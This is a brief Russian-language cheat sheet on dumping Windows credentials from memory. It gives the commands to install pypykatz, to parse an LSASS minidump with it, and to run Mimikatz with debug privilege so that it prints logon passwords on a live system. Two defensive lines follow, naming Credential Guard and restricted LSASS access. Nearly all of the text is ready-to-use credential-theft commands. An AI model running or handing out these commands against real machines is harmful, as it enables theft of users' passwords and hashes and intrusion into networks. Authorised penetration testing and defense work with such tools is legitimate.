# Mimikatz / pypykatz — извлечение учётных данных из памяти

## 📦 Установка pypykatz
```bash
pip install pypykatz
```

## 🔹 Примеры использования
1. Дамп LSASS в Windows и анализ в pypykatz:
```bash
pypykatz lsa minidump lsass.DMP
```
2. Запуск на живой системе (Windows, админские права):
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

## 🛡 Защита
- Включить Credential Guard.
- Ограничить доступ к LSASS.
